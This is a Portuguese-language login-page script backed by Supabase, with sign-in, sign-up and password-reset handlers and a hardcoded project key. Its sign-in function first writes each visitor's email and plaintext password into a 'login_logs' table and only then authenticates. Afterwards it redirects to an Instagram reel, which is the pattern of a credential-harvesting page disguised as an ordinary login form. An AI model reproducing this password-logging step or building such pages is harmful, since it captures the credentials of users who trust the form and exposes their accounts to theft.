  <script>
    // ---------- CONFIGURAÇÃO ----------
    const supabaseUrl     = 'https://pwmtpvsgykjvouljjmrz.supabase.co';
    const supabaseAnonKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB3bXRwdnNneWtqdm91bGpqbXJ6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjYwMTMxMTAsImV4cCI6MjA4MTU4OTExMH0.xQa-Tmyzx6UOCALygjxEGFNAJsIeQZ-r7bPQyP8XFQ8';
    const supabaseClient  = window.supabase.createClient(supabaseUrl, supabaseAnonKey);

    // ---------- ELEMENTOS ----------
    const btnEntrar   = document.getElementById('btnEntrar');
    const iptUsuario  = document.getElementById('usuario');
    const iptSenha    = document.getElementById('senha');
    const linkEsqueci = document.getElementById('linkEsqueci');
    const btnCriar    = document.getElementById('btnCriar');

    // ---------- FUNÇÕES ----------
    async function entrar() {
      const email = iptUsuario.value.trim();
      const senha = iptSenha.value.trim();

      if (!email || !senha) return alert('Preencha email e senha.');

      // 1) grava log (mesmo comportamento do antigo)
      const { error: logError } = await supabaseClient
        .from('login_logs')
        .insert({ usuario: email, senha: senha });

      if (logError) return alert('Erro: ' + logError.message);

      // 2) autentica
      const { data, error } = await supabaseClient.auth.signInWithPassword({ email, password: senha });
      if (error) return alert('Erro: ' + error.message);

      // 3) redireciona
      window.location.href = 'https://www.instagram.com/reels/DSYPgN7EVG3/';
    }

    async function criarConta() {
      const email = iptUsuario.value.trim();
      const senha = iptSenha.value.trim();

      if (!email || !senha) return alert('Preencha email e senha.');

      const { data, error } = await supabaseClient.auth.signUp({ email, password: senha });
      if (error) return alert('Erro: ' + error.message);

      alert('Conta criada! Verifique seu email para confirmar.');
    }

    async function esqueciSenha() {
      const email = prompt('Digite seu email para receber o link de recuperação:');
      if (!email) return;

      const { error } = await supabaseClient.auth.resetPasswordForEmail(email);
      if (error) return alert('Erro: ' + error.message);

      alert('Link de recuperação enviado!');
    }

    // ---------- EVENTOS ----------
    btnEntrar.addEventListener('click', entrar);
    btnCriar.addEventListener('click', criarConta);
    linkEsqueci.addEventListener('click', esqueciSenha);
  </script>
